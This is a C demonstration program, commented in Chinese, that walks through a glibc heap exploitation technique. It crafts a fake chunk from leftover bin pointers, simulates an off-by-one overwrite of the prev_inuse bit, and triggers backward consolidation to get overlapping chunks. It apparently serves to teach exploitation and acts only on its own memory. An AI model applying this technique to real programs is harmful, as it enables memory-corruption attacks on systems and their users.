#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

// 透過 off-by-one 蓋 prev_inuse bit，配合 fake chunk + consolidate 的機制製造出 chunk overlap
int main()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    // padding address to 0xXXXXXXXX0000
    void *tmp = malloc(0x1);
    void *heap_base = (void *)((long)tmp & (~0xfff));
    size_t size = 0x10000 - ((long)tmp & 0xffff) - 0x20;
    void *padding = malloc(size);

    // allocate 2 chunks
    void *prev = malloc(0x500);
    void *victim = malloc(0x4f0);
    malloc(0x10); // avoid consolidation

    void *a = malloc(0x4f0);
    malloc(0x10); // avoid consolidation

    void *b = malloc(0x510);
    malloc(0x10); // avoid consolidation

    free(a);
    free(b);
    free(prev);
    // now a,b,prev are in unsorted bin
    // we allocate a large chunk to make them go to largebin
    malloc(0x1000);

    void *prev2 = malloc(0x500);
    assert(prev == prev2);

    // create fake chunk
    ((long *)prev2)[1] = 0x501;
    *(long *)(prev2 + 0x500) = 0x500; // prev_size of next chunk

    void *b2 = malloc(0x510); // get chunk b
    assert(b == b2);

    // 透過殘留的 pointer，讓 b2 的 fd 指向 fake chunk
    ((char *)b2)[0] = '\x10';
    ((char *)b2)[1] = '\x00';

    void *a2 = malloc(0x4f0);
    assert(a == a2);
    free(a2);
    free(victim); // make a2->bk == victim
    
    void *a3 = malloc(0x4f0); // 從 unsorted bin 取出，拿到先前的 a2
    // 透過殘留的 pointer a3 的 bk 指向 fake chunk
    ((char *)a3)[8] = '\x10';
    ((char *)a3)[9] = '\x00';
    assert(a == a2 && a2 == a3);
    
    // 從 unsorted bin 當中取得 victim
    void *victim2 = malloc(0x4f0);
    assert(victim == victim2);
    // ! vuln
    // 覆蓋 victim2 的 prev_inuse 成 0
    ((char *)victim2)[-8] = '\x00';

    // trigger backward consolidation，使得 fake chunk 也被放到 unsorted bin 當中
    free(victim);
    void *merged = malloc(0x100);
    memset(merged, 'A', 0x80);
    memset(prev2, 'C', 0x80);

    // 'prev2' 與剛建立的 'merged' 重疊
    assert(strstr(merged, "CCCCCCCCC"));
}